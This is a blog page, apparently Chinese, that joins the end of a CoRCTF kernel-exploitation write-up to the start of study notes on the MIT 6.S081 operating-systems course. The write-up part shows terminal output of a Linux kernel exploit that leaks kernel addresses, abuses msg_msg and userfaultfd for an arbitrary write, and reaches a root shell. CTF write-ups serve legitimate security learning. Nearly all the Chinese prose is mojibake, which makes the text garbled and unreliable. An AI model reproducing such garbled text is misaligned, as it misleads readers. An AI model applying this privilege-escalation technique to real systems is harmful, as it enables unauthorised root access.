<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">ctf@CoRCTF:/$ /myexp</span><br><span class="line"> msg_queue_addr:0xffffa041855bf6c0 </span><br><span class="line"> page_msg_addr:0xffffa041855c1000 </span><br><span class="line"> kernelbase_addr:0xffffffff9ea00000 </span><br><span class="line"> init_task_addr:0xffffffff9f6124c0 </span><br><span class="line"> init_cred_addr:0xffffffff9f633060 </span><br><span class="line"> pid:0  getpid:86 </span><br><span class="line"> pid:86  getpid:86 </span><br><span class="line"> current_task_addr:0xffffa04186128ac0 </span><br><span class="line">[+] handler_write_task created</span><br><span class="line">[+] handler_write_msg created</span><br><span class="line">[*] page fault 1 at page1+0x1000</span><br><span class="line">get_page_msg</span><br><span class="line">[+] page fault 2 at page2+0x1000</span><br><span class="line">write msg ok</span><br><span class="line">[*] msg next write is ok</span><br><span class="line">write task ok</span><br><span class="line"> debug</span><br><span class="line">uid:0</span><br><span class="line">root@CoRCTF:/<span class="comment"># id</span></span><br><span class="line">uid=0(root) gid=0(root)</span><br></pre></td></tr></table></figure>

<h2 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h2><p>åˆ©ç”¨msgè¿›è¡Œè¶Šç•Œè¯»å’Œä»»æ„è¯»è¿˜æ˜¯å¾ˆå¥½ç”¨çš„ï¼Œä½†æ³¨æ„å¾—å¼€å¯<code>MSG_COPY</code>,ä½†æ˜¯é€šè¿‡msgè¿›è¡Œä»»æ„å†™è¿˜å¾—é…åˆ<code>userfault</code>,ä½†åœ¨é«˜ç‰ˆæœ¬ä¸­åªæœ‰rootç”¨æˆ·æ‰èƒ½ä½¿ç”¨<code>userfault</code>ï¼Œæ‰€ä»¥æ„Ÿè§‰åˆ©ç”¨msgè¿›è¡Œä»»æ„è¯»åœ¨çœŸå®åœºæ™¯ä¸­ä¸å¥½å®ç°çš„ã€‚</p>
<h2 id="æ€è€ƒ"><a href="#æ€è€ƒ" class="headerlink" title="æ€è€ƒ"></a>æ€è€ƒ</h2><p>åœ¨æœ¬é¢˜çš„åˆ©ç”¨ä¸­ï¼Œé™¤äº†uafä»¥å¤–è¿˜æä¾›äº†å†™æ¥å£ï¼Œæˆ‘åœ¨æƒ³æ˜¯å¦ç»§ç»­å‹ç¼©æ¡ä»¶ï¼Œä¸ä½¿ç”¨è¿™ä¸ªå†™æ¥å£ï¼Œè€Œæ˜¯é€šè¿‡æŠŠè¿™ä¸ªuafè½¬åŒ–æˆä¸€ä¸ªdoublefreeç„¶åä½¿ç”¨ä¸€ä¸ªé€šè§£å®Œæˆåˆ©ç”¨ï¼Œæˆ‘åœ¨å…¶ä»–åšå®¢ä¸­è§åˆ°è¿‡ç±»ä¼¼æ€è·¯ï¼Œæ„Ÿè§‰æ˜¯å¯è¡Œçš„ï¼Œè¯•è¯•çœ‹ã€‚</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://example.com/2022/10/17/mit6-081%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E8%AF%BE%E7%A8%8B%E5%8F%8A%E5%AE%9E%E9%AA%8C/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="rootzhang">
      <meta itemprop="description" content="æˆ‘çš„åšå®¢">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="study">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2022/10/17/mit6-081%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E8%AF%BE%E7%A8%8B%E5%8F%8A%E5%AE%9E%E9%AA%8C/" class="post-title-link" itemprop="url">mit6.081æ“ä½œç³»ç»Ÿè¯¾ç¨‹åŠå®éªŒ</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">å‘è¡¨äº</span>

              <time title="åˆ›å»ºæ—¶é—´ï¼š2022-10-17 23:45:13" itemprop="dateCreated datePublished" datetime="2022-10-17T23:45:13+08:00">2022-10-17</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">æ›´æ–°äº</span>
                <time title="ä¿®æ”¹æ—¶é—´ï¼š2022-10-25 01:14:03" itemprop="dateModified" datetime="2022-10-25T01:14:03+08:00">2022-10-25</time>
              </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="mit6-s081"><a href="#mit6-s081" class="headerlink" title="mit6.s081"></a>mit6.s081</h1><h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>åœ¨å­¦ä¹ äº†ä¸€æ®µæ—¶é—´çš„kernelpwnåï¼Œå‘ç°è‡ªå·±å¯¹äºæ“ä½œç³»ç»Ÿç†è§£çš„è¿˜æ˜¯ååˆ†æµ…è–„ï¼Œé‚æƒ³æµ…æµ…æ·±å…¥å­¦ä¹ ä¸€ä¸‹ï¼Œç„¶åä»a3å¤§ä½¬å¾—çŸ¥mitçš„æ“ä½œç³»ç»Ÿè¯¾ç¨‹ååˆ†ä¹‹å¥½ä¾¿ä¸‹å®šå†³å¿ƒè·Ÿç€è¿‡ä¸€éï¼Œæœ¬æ¥æ˜¯æƒ³å­¦ä¹ mit6.828çš„ï¼Œä½†ä¸ç®¡æ•™æè¿˜æ˜¯è§†é¢‘å…¨æ˜¯æ´‹æ–‡ï¼Œè€Œæˆ‘çš„æ´‹æ–‡èƒ½åŠ›ç€å®æœ‰é™ï¼Œå¹¸å¥½æˆ‘æ‰¾è§äº†mit6.s081ç‰ˆï¼Œä¹Ÿåœ¨ç½‘ä¸Šæ‰¾è§äº†ç¿»è¯‘ç‰ˆï¼Œè¿˜æœ‰è¯¸å¤šåšå®¢å¯ä»¥ç­”ç–‘ï¼Œæ„Ÿè§‰å¯è¡Œï¼Œé‚£å°±å¼€å¹²ï¼</p>
<h2 id="å‡†å¤‡"><a href="#å‡†å¤‡" class="headerlink" title="å‡†å¤‡"></a>å‡†å¤‡</h2><h3 id="git"><a href="#git" class="headerlink" title="git"></a>git</h3><p>è¯¾ç¨‹ä½¿ç”¨çš„æ˜¯gitè¿›è¡Œä»£ç ç®¡ç†å’Œç‰ˆæœ¬æ§åˆ¶çš„ï¼Œå¯ç¬‘æˆ‘åˆ°ç›®å‰ä¸ºæ­¢åªç†Ÿæ‚‰<code>git close</code>,æ‰€ä»¥å†å¼€å§‹ä¹‹å‰å¾—äº†è§£ä¸€ä¸‹gitçš„å‘½ä»¤ã€‚</p>
<p>çœ‹äº†å‡ ä¸ªå°æ—¶ï¼Œå¤§æ¦‚èƒ½ä½¿ç”¨äº†ã€‚</p>
<h3 id="RSIC-VæŒ‡ä»¤é›†"><a href="#RSIC-VæŒ‡ä»¤é›†" class="headerlink" title="RSIC-VæŒ‡ä»¤é›†"></a>RSIC-VæŒ‡ä»¤é›†</h3><p>â€¦â€¦æ­¤å¤„çœç•¥å¥½å¤šå­—</p>
<h3 id="ç¯å¢ƒå‡†å¤‡"><a href="#ç¯å¢ƒå‡†å¤‡" class="headerlink" title="ç¯å¢ƒå‡†å¤‡"></a>ç¯å¢ƒå‡†å¤‡</h3><p>æˆ‘ä½¿ç”¨çš„æ˜¯æœ€æ–°çš„ubuntu22,å…¶å®å®Œå…¨ä¸ç”¨æœä»€ä¹ˆæ­å»ºç¯å¢ƒæ•™ç¨‹çš„ï¼Œè¯¾ç¨‹çš„ç½‘é¡µå·²ç»éå¸¸æ¸…æ¥šäº†ï¼ˆä»–æ¨èçš„æ˜¯ubuntu20.4ï¼‰ï¼ŒæŒ‰ç…§å®ƒæ‰€è¿°ä¸€æ­¥ä¸€æ­¥æ¥å°±å¥½äº†ï¼Œå¯æƒœæˆ‘æ„è¯†åˆ°è¿™ä¸€ç‚¹çš„æ—¶å€™å·²ç»æµªè´¹äº†ä¸€ä¸¤ä¸ªå°æ—¶äº†</p>
<p>å‡†å¤‡å®Œç¯å¢ƒæœ€æ¿€åŠ¨äººå¿ƒçš„å°±æ˜¯å®éªŒè°ƒè¯•ç¯å¢ƒè§£äº†ï¼Œè°ƒè¯•æˆ‘å‚è€ƒçš„æ˜¯è¿™ç¯‡æ–‡ç« <a target="_blank" rel="noopener" href="https://xistor.github.io/post/6.s081/xv6-gdb/">qemu xv6 ä½¿ç”¨GDBè°ƒè¯• - xistorâ€™s notes</a></p>
<p><img src="C:\Users\å¼ é¹\AppData\Roaming\Typora\typora-user-images\image-20220806173357404.png" alt="image-20220806173357404"></p>
<p>æˆ‘åœ¨lsä¸Šä¸‹äº†æ–­ç‚¹ï¼Œå¯è§æˆåŠŸæˆªä½äº†ã€‚</p>
<p>ä»è¿™ç¯‡æ–‡ç« ä¸­äº†è§£åˆ°äº†å…³äº<del>/.gdbinitæ–‡ä»¶çš„ä½¿ç”¨ï¼Œå¯ä»¥å‘è¿™ä¸ªæ–‡ä»¶ä¸­å†™å…¥gdbå‘½ä»¤ï¼Œå½“gdbæ‰§è¡Œçš„æ—¶å€™ä¼šåœ¨å½“å‰ç”¨æˆ·çš„ä¸»ç›®å½•ä¸‹å¯»æ‰¾<code>.gdbinit</code>æ–‡ä»¶ç„¶åæ‰§è¡Œå…¶ä¸­çš„å‘½ä»¤ï¼Œå½“ä½ æƒ³è¦gdbæ‰§è¡Œä¸åœ¨å½“å‰ç”¨æˆ·çš„ä¸»ç›®å½•ä¸‹çš„<code>.gdbinit</code>çš„æ—¶å€™ï¼Œå¯ä»¥åœ¨`</del>/.gdbinit<code>æ–‡ä»¶ä¸­å¯¼å…¥ï¼Œä¾‹å¦‚</code>add-auto-load-safe-path /home/x/xv6-labs-2021/.gdbinit<code>,è¿™æ ·åšçš„è¯è°ƒè¯•çš„æ—¶å€™å°±éå¸¸æ–¹ä¾¿äº†ï¼Œåªéœ€è¦é”®å…¥</code>gdb-multiarch`å°±å¯ä»¥ç›´æ¥è®¾ç½®æ¶æ„å¹¶è¿æ¥qemuäº†ã€‚</p>
<h2 id="Lecture"><a href="#Lecture" class="headerlink" title="Lecture"></a>Lecture</h2><h4 id="Lecture1"><a href="#Lecture1" class="headerlink" title="Lecture1"></a>Lecture1</h4><p>è®²äº†ä¸€ç‚¹æ“ä½œç³»ç»Ÿå¤§ä½“ä½œç”¨ä»¥åŠç»“æ„ï¼Œç„¶åé€šè¿‡å‡ ä¸ªä¾‹å­ç¤ºèŒƒäº†ç³»ç»Ÿè°ƒç”¨ï¼Œå…¶ä¸­æ¯”è¾ƒæœ‰æ”¶è·çš„æ˜¯fork+execä¸¤ä¸ªç³»ç»Ÿè°ƒç”¨çš„æ­é…å¯ä»¥åœ¨å­è¿›ç¨‹é‡æ–°è½½å…¥ä¸€ä¸ªæ–°ç¨‹åºï¼Œæ‰€ä»¥åŸæ¥çš„å­è¿›ç¨‹è¢«å®Œå…¨å–ä»£ï¼Œä¸€èˆ¬æƒ…å†µä¸‹execå‡½æ•°ä¸ä¼šè¿”å›ã€‚å€¼å¾—æ³¨æ„çš„æ˜¯exec()åçš„ç¨‹åºçš„æ–‡ä»¶æè¿°ç¬¦å¹¶æ²¡æœ‰é‡ç½®ï¼Œè¿˜æ˜¯å’Œæºç¨‹åºä¸€æ ·ï¼Œåˆ©ç”¨è¿™ä¸ªç‰¹æ€§å¯ä»¥å®Œæˆä¸€äº›éªšæ“ä½œã€‚</p>
<p>æ€»ä½“æ¯”è¾ƒç®€å•ã€‚è¿™èŠ‚è¯¾æœ‰è¯¾åå®éªŒï¼Œæˆ‘çœ‹è¯¾ç¨‹ä»‹ç»å¥½åƒå¯ä»¥åœ¨æœ¬åœ°æµ‹è¯•è‡ªå·±çš„å®éªŒå¹¶æ‰“å‡ºåˆ†æ•°ï¼Œå†è¥¿ï¼Œæ˜å¤©çœ‹çœ‹æ€ä¹ˆæ•´ã€‚</p>
<h4 id="Lecture3"><a href="#Lecture3" class="headerlink" title="Lecture3"></a>Lecture3</h4><p><strong>éš”ç¦»æ€§</strong>ï¼šæ“ä½œç³»ç»Ÿæä¾›è¿›ç¨‹å’Œè¿›ç¨‹ä¹‹é—´çš„å¢™éš”ç¦»ä»¥åŠè¿›ç¨‹å’Œç¡¬ä»¶èµ„æºçš„å¼ºéš”ç¦»ï¼Œéš”ç¦»çš„æ‰‹æ®µæ˜¯è¿›è¡ŒæŠ½è±¡ï¼Œæä¾›ç³»ç»Ÿè°ƒç”¨æ¥å£ã€‚</p>
<p><strong>é˜²å¾¡æ€§</strong>ï¼šé¦–å…ˆå¾—å…·æœ‰é”™è¯¯å¤„ç†èƒ½åŠ›ï¼Œå¦‚æœç”¨æˆ·æ€è¿›ç¨‹ä½¿ç”¨ç³»ç»Ÿè°ƒç”¨çš„æ—¶å€™ä¼ å…¥äº†é”™è¯¯çš„å‚æ•°ï¼Œå†…æ ¸å¾—å…·æœ‰å¤„ç†è¿™ç§é”™è¯¯çš„èƒ½åŠ›ï¼Œå…¶æ¬¡æ˜¯åº”ç”¨ç¨‹åºä¸èƒ½ç ´åéš”ç¦»æ€§ï¼Œè¿™é‡Œçš„éš”ç¦»æŒ‡è¿›ç¨‹å’Œå†…æ ¸çš„éš”ç¦»ï¼Œæƒ³è¦å®ç°è¿™ç§éš”ç¦»æ€§å¾—éœ€è¦ç¡¬ä»¶æ”¯æŒï¼Œæ¯”å¦‚å†…æ ¸æ¨¡å¼å’Œç”¨æˆ·æ¨¡å¼ä»¥åŠè™šæ‹Ÿå†…å­˜ã€‚</p>
<p><strong>user/kernel</strong>:å½“cpuè¿è¡Œåœ¨kernelæ¨¡å¼ä¸­å°±ä¼šæ‹¥æœ‰æ‰§è¡Œç‰¹æƒæŒ‡ä»¤çš„æƒé™ï¼Œç‰¹æƒæŒ‡ä»¤æŒ‡ç›´æ¥æ“ä½œç¡¬ä»¶çš„æŒ‡ä»¤ï¼Œç›¸å¯¹çš„è¿è¡Œåœ¨useræ¨¡å¼åªèƒ½æ‰§è¡Œéç‰¹æƒæŒ‡ä»¤ï¼Œå½“useræ¨¡å¼ä¸‹æ‰§è¡Œç‰¹æƒæŒ‡ä»¤æ—¶cpuå¹¶ä¸ä¼šçœŸæ­£å»æ‰§è¡Œï¼Œè€Œæ˜¯ä»userè·³åˆ°kernelï¼Œå†…æ ¸è·å¾—cpuæ§åˆ¶æƒï¼Œç„¶åè®©å†…æ ¸åˆ¤æ–­useræ˜¯å¦å‡ºç°äº†é—®é¢˜æ˜¯å¦æ”¹æ€æ­»ã€‚</p>
<p><strong>user-&gt;kernel</strong>:æœ‰ä¸“é—¨çš„çš„ä¸€ä¸ªæŒ‡ä»¤å¯ä»¥ä»useråˆ°kernel,åœ¨x86ä¸‹æ˜¯syscall,åœ¨æœ¬æ¬¡è¯¾ç¨‹ä¸­çš„risc-vä¸­æ˜¯<code>ecall</code>ï¼Œç³»ç»Ÿè°ƒç”¨å·å­˜å‚¨åœ¨<code>a0</code>å¯„å­˜å™¨ä¸­ã€‚</p>
<p><strong>å®å†…æ ¸&amp;å¾®å†…æ ¸</strong>ï¼šç›¸æ¯”èµ·å®å†…æ ¸ï¼Œå¾®å†…æ ¸çš„è¯¸å¤šæœåŠ¡éƒ½è¿è¡Œåœ¨useræ¨¡å¼ï¼Œåœ¨æ™®é€šè¿›ç¨‹æƒ³è¦ä½¿ç”¨è¿™äº›æœåŠ¡çš„æ—¶å€™é€šçŸ¥å†…æ ¸ï¼Œå†…æ ¸å†é€šçŸ¥æœåŠ¡ï¼Œè¿™æ ·ä¼šå¯¼è‡´Userå’Œkernelçš„åˆ‡æ¢æ¯”è¾ƒé¢‘ç¹ã€‚</p>
<h4 id="Lecture4"><a href="#Lecture4" class="headerlink" title="Lecture4"></a><strong>Lecture4</strong></h4><blockquote>
<p>å¯¹è™šæ‹Ÿå†…å­˜çš„çœ‹æ³•</p>
<p>åœ¨æˆ‘çœ‹æ¥è™šæ‹Ÿå†…å­˜ä¸»è¦æœ‰ä¸¤ç‚¹ï¼Œä¸€ç‚¹æ˜¯å®Œç¾çš„è¿›ç¨‹éš”ç¦»ï¼Œæ¯ä¸ªè¿›ç¨‹éƒ½æœ‰è‡ªå·±çš„é¡µè¡¨ï¼Œä¸ä¼šè®¿é—®åˆ°å…¶ä»–è¿›ç¨‹çš„é¡µè¡¨ï¼ŒäºŒæ˜¯ä¸ç›´æ¥æ“ä½œç‰©ç†å†…å­˜ï¼Œä¹Ÿå°±æ˜¯ç¡¬ä»¶ï¼Œä¼šæ¯”è¾ƒå¥½çš„ä¿æŠ¤ç¡¬ä»¶</p>
</blockquote>
<p>risc-vè™šæ‹Ÿå†…å­˜ç®€å•ç†è§£ï¼šå’Œx86å¾ˆç±»ä¼¼ï¼Œä¹Ÿæœ‰ä¸€ä¸ªmmuè·¯ç”±å¯¹cpuæƒ³è¦è®¿é—®çš„è™šæ‹Ÿåœ°å€è¿›è¡Œç¿»è¯‘ï¼Œç¿»è¯‘æˆç‰©ç†å†…å­˜ï¼Œ<code>stap</code>å¯„å­˜å™¨å°±å­˜æ”¾ç€è¿›ç¨‹çš„é¡µè¡¨çš„ç‰©ç†åœ°å€ï¼Œä¹Ÿè¡¨ä¸­å°±å­˜æ”¾ç€è™šæ‹Ÿå†…å­˜åˆ°ç‰©ç†å†…å­˜çš„æ˜ å°„ï¼Œmmuå°±é€šè¿‡è®¿é—®stapæ¥è¿›è¡Œç¿»è¯‘</p>
<p><strong>é¡µè¡¨è®¾è®¡</strong></p>
<p>åœ¨xv6æ“ä½œç³»ç»Ÿä¸­è™šæ‹Ÿåœ°å€çš„å‰25ä½å¹¶æ²¡æœ‰è¢«ä½¿ç”¨ï¼Œæ‰€ä»¥å°½ç®¡å¯„å­˜å™¨æ˜¯64ä½ï¼Œç‰©ç†åœ°å€æ˜¯56ä½ï¼Œä½†å…¶å¯»å€ç©ºé—´è¿˜æ˜¯2^39ï¼Œåœ¨è¿™39ä½ä¸­å‰27ä½æ˜¯ç´¢å¼•ï¼Œå12ä½æ˜¯åç§»ã€‚</p>
<p>xv6çš„é¡µè¡¨è®¾è®¡æ˜¯é‡‡ç”¨ä¸‰çº§é¡µè¡¨çš„ï¼Œä¸åƒx86çš„å››çº§é¡µè¡¨ï¼Œä¹‹æ‰€ä»¥é‡‡ç”¨ä¸‰çº§é¡µè¡¨ï¼Œæ˜¯å› ä¸ºä¸€ä¸ªé¡µè¡¨å ç”¨4k,æ¯ä¸€ä¸ªé¡µè¡¨é¡¹æ‰€å ç”¨çš„å†…å­˜æ˜¯2^3,æ‰€ä»¥ä¸€ä¸ªé¡µè¡¨å¯ä»¥æœ‰2^9ä¸ªé¡µè¡¨ï¼Œ27/9=3,æ‰€ä»¥ä¸‰ä¸ªé¡µè¡¨å°±å®Œå…¨å¤Ÿæ˜ å°„æ‰€æœ‰çš„ç´¢å¼•äº†ã€‚</p>
<p><img src="C:\Users\å¼ é¹\AppData\Roaming\Typora\typora-user-images\image-20220824152319391.png" alt="image-20220824152319391"></p>
<p>æ¯ä¸€ä¸ªé¡µè¡¨é¡¹æ˜¯64ä½å…¶ä¸­æœ€é«˜çš„10ä½å¹¶æ²¡æœ‰è¢«ä½¿ç”¨ï¼Œå› ä¸ºæ²¡å¿…è¦ï¼Œç„¶åå44ä½è®°å½•é¡µç¼–å·ï¼ˆå› ä¸ºä¸€å…±åªæœ‰2^44ä¸ªé¡µï¼‰ï¼Œç„¶åå10ä½è®°å½•ä¸€äº›æ ‡å¿—ï¼Œç”¨æ¥æ ‡è¯†è¿™ä¸ªé¡µè¡¨é¡¹ã€‚</p>
<p><img src="C:\Users\å¼ é¹\AppData\Roaming\Typora\typora-user-images\image-20220824153329033.png" alt="image-20220824153329033"></p>
<p><strong>TLB</strong></p>
<p>é‡‡ç”¨ä¸‰çº§é¡µè¡¨çš„è¯å¾—åˆ°ä¸€ä¸ªå…·ä½“çš„ç‰©ç†åœ°å€å°±éœ€è¦è®¿é—®è®¿é—®å†…å­˜ä¸‰æ¬¡ï¼Œè¿™æ˜¯éå¸¸æ˜‚è´µçš„ï¼Œæ‰€ä»¥å°±åƒx86æœ‰ç¼“å­˜ä¸€æ ·ï¼Œxv6ä¹Ÿæœ‰ç¼“å­˜ï¼Œä¹Ÿå«ä½œTLBï¼Œå‚¨å­˜ç€æœ€è¿‘è®¿é—®çš„è™šæ‹Ÿåœ°å€åˆ°ç‰©ç†åœ°å€ä¹‹é—´çš„æ˜ å°„ã€‚</p>
<p>åœ¨xv6æ“ä½œç³»ç»Ÿä¸­ä¼¼ä¹è¿˜æ²¡æœ‰å®ç°å¤šä¸ªè¿›ç¨‹ä½¿ç”¨åŒä¸€ä¸ªTLB,æ‰€ä»¥å½“åˆ‡æ¢è¿›ç¨‹çš„æ—¶å€™ä¹Ÿéœ€è¦åˆ·æ–°TLBé˜²æ­¢æ˜ å°„å‡ºé”™ã€‚TLBè¿˜æ˜¯ä¸€ä¸ªç¡¬ä»¶ï¼Œå¹¶ä¸ç”±æ“ä½œç³»ç»Ÿå…·ä½“æ§åˆ¶ã€‚</p>
<p><strong>è™šæ‹Ÿåœ°å€åˆ†å¸ƒå’Œç‰©ç†åœ°å€åˆ†å¸ƒ</strong></p>
<p>ç‰©ç†å†…å­˜çš„åˆ†å¸ƒéƒ½æ˜¯æœ‰è®¾è®¡è€…æ§åˆ¶çš„ï¼Œå¹¶ä¸ç”±æ“ä½œç³»ç»Ÿæ§åˆ¶ï¼Œåœ¨ç‰©ç†å†…å­˜ä¸‹é¢çš„é‚£äº›ä½ç½®å¹¶ä¸æ˜¯çœŸå®å­˜åœ¨äºå†…å­˜ä¸­çš„ï¼Œè€Œæ˜¯ä¸€ç§æ˜ å°„ï¼Œæ¯”å¦‚ä¸­æ–­æˆ–è€…ioä»€ä¹ˆçš„ã€‚</p>
<p>ä¸ºäº†è®©xv6æ“ä½œç³»ç»Ÿèƒ½å¤Ÿæ¯”è¾ƒç®€å•ç®€çº¦ï¼Œè™šæ‹Ÿåœ°å€éƒ½æ˜¯é‡‡ç”¨æ’ç­‰æ˜ å°„çš„ã€‚</p>
<p><img src="C:\Users\å¼ é¹\AppData\Roaming\Typora\typora-user-images\image-20220824160019857.png" alt="image-20220824160019857"></p>
<p>ä¸Šé¢çš„è™šæ‹Ÿåœ°å€åˆ†å¸ƒä¼¼ä¹åªæ˜¯å†…æ ¸è™šæ‹Ÿåœ°å€åˆ†å¸ƒï¼Œå†…æ ¸ä¼šåœ¨<code>free memory</code>ä¸­ä¸ºè¿›ç¨‹åˆ†é…ç©ºé—´ï¼Œä¸‹é¢æ˜¯è¿›ç¨‹çš„è™šæ‹Ÿåœ°å€åˆ†å¸ƒ</p>
<p><img src="C:\Users\å¼ é¹\AppData\Roaming\Typora\typora-user-images\image-20220824164115781.png" alt="image-20220824164115781"></p>
<h4 id="Lecture5"><a href="#Lecture5" class="headerlink" title="Lecture5"></a><strong>Lecture5</strong></h4><p>æœ¬èŠ‚è¯¾ç¨‹ä¸»è¦æ˜¯è®²è§£<code>risc-v</code></p>
<p>åœ¨gdbä¸­è¾“å…¥<code>tui enable</code>å°±èƒ½è¿›å…¥ä¸€ä¸ªç•Œé¢ï¼Œåœ¨ç•Œé¢ä¸­è¾“å…¥<code>layout asm</code>æˆ–è€…<code>layout reg</code>ï¼Œ<code>layout src</code>å°±èƒ½æŸ¥çœ‹æ±‡ç¼–æˆ–è€…å¯„å­˜å™¨çš„å€¼æˆ–è€…æºä»£ç äº†ã€‚å¦‚æœæƒ³è¦èšç„¦æŸä¸ªçª—å£å°±å¯ä»¥è¾“å…¥<code>focus xxx</code></p>
<p>ç»ˆäºå­¦ä¼šäº†æ€ä¹ˆè‡ªåŠ¨å¼€å¤šä¸ªshellå¹³é“ºåˆ°æ¡Œé¢äº†ï¼Œé¦–å…ˆè¾“å…¥<code>tmux</code>,æ‰“å¼€ä¸€ä¸ªshell,åœ¨æ‰“å¼€ä¸€ä¸ªshellå°±æ˜¯å…ˆåŒæ—¶æŒ‰<code>ctrl+b</code>ç„¶åå•ç‹¬æŒ‰<code>c</code>,ç„¶åå¯ä»¥ä½¿ç”¨<code>ctrl+b</code>+p/næ¥åˆ‡æ¢shellçª—å£ï¼Œå¯ä»¥ä½¿ç”¨<code>ctrl b</code>+<code>shift+%</code>åˆ‡å‡ºæ–°çª—å£ï¼Œç„¶åä½¿ç”¨<code>ctrl+b</code>+oæ¥åˆ‡æ¢çª—å£ã€‚</p>
<p>ä½¿ç”¨<code>bt</code>å¯ä»¥æŸ¥çœ‹è°ƒç”¨æ ˆ</p>
<p>æ¡ä»¶æ–­ç‚¹å‘½ä»¤<code>b xxx if i==5</code></p>
<p>å¯„å­˜å™¨è¡¨</p>
<p>a0<del>a7å¯ä»¥å­˜æ”¾å‡½æ•°è°ƒç”¨å‚æ•°ï¼Œa0</del>a1å¯ä»¥å­˜æ”¾è¿”å›å€¼</p>
<p><img src="C:\Users\å¼ é¹\AppData\Roaming\Typora\typora-user-images\image-20220901133841549.png" alt="image-20220901133841549"></p>
<h5 id="risc-vçš„å‡½æ•°è°ƒç”¨"><a href="#risc-vçš„å‡½æ•°è°ƒç”¨" class="headerlink" title="risc-vçš„å‡½æ•°è°ƒç”¨"></a>risc-vçš„å‡½æ•°è°ƒç”¨</h5><p>å’Œè®°å¿†ä¸­mipsçš„å‡½æ•°è°ƒç”¨å¾ˆç±»ä¼¼ï¼Œrisc-vä¸­æœ‰ä¸€ä¸ªå¯„å­˜å™¨ä¸“é—¨ç”¨æ¥è®°å½•è¿™ä¸ªå‡½æ•°çš„è¿”å›åœ°å€ï¼Œå½“æ‰§è¡Œ<code>ret</code>çš„å‡½æ•°ï¼Œå°±ä¼šæŠŠpcæŒ‡å‘<code>ra</code>å¯„å­˜å™¨ä¿å­˜çš„åœ°å€ï¼Œä½†æ˜¯raå¯„å­˜å™¨åªæœ‰ä¸€ä¸ªï¼Œä½†æ˜¯å‡½æ•°aå¯ä»¥è°ƒç”¨å‡½æ•°b,å½“æ‰§è¡Œå‡½æ•°bçš„æ—¶å€™ï¼Œraå¯„å­˜å™¨æŒ‡å‘å‡½æ•°bçš„è¿”å›å€¼ï¼Œä½†æ˜¯å‡½æ•°bä¹Ÿå¯ä»¥è°ƒç”¨å‡½æ•°c,å½“æ‰§è¡Œå‡½æ•°cçš„æ—¶å€™raä¿å­˜å‡½æ•°cçš„è¿”å›å€¼ï¼Œå½“è¿”å›åˆ°å‡½æ•°bçš„æ—¶å€™ï¼Œraè¿˜æ˜¯æŒ‡å‘äº†å‡½æ•°cçš„è¿”å›å€¼ï¼Œè¿™æ ·å°±ä¼šé€ æˆæ­»å¾ªç¯äº†ï¼Œæ‰€ä»¥risc-vå°±æœ‰ä¸€ä¸ªç­–ç•¥ï¼Œå½“æŒ‡å‘éå¶å­å‡½æ•°ï¼ˆä¹Ÿå°±æ˜¯è¿™ä¸ªå‡½æ•°è¿˜ä¼šè°ƒç”¨å…¶ä»–å‡½æ•°ï¼‰ï¼Œå°±ä¼šæŠŠraä¿å­˜åˆ°æ ˆé‡Œï¼Œå½“å‡½æ•°è¿”å›çš„æ—¶å€™å…ˆæŠŠæ ˆé‡Œçš„è¿”å›åœ°å€åŠ è½½åˆ°raä¸­å†æ‰§è¡Œ<code>ret</code>æŒ‡ä»¤ï¼Œå½“æ‰§è¡Œå¶å­å‡½æ•°çš„æ—¶å€™ï¼Œå°±ä¸ä¼šåœ¨æ ˆé‡Œä¿å­˜raå¯„å­˜å™¨äº†ï¼Œå½“æ‰§è¡Œ<code>ret</code>çš„æ—¶å€™ç›´æ¥åŠ è½½<code>ra</code>å¯„å­˜å™¨ã€‚</p>
<p><img src="C:\Users\å¼ é¹\AppData\Roaming\Typora\typora-user-images\image-20220901210847634.png" alt="image-20220901210847634"></p>
<h4 id="Lecture6"><a href="#Lecture6" class="headerlink" title="Lecture6"></a>Lecture6</h4><p>åœ¨å†…æ ¸æ€çš„æ—¶å€™æƒé™æå‡ä¸»è¦ä½“ç°åœ¨ä¸¤ç‚¹ï¼Œä¸€ç‚¹æ˜¯å¯ä»¥è¯»å†™æ§åˆ¶å¯„å­˜å™¨ï¼Œç¬¬äºŒç‚¹æ˜¯å¯ä»¥å¯ä»¥ä½¿ç”¨æ²¡æœ‰<code>pte_u</code>çš„é¡µè¡¨ã€‚</p>
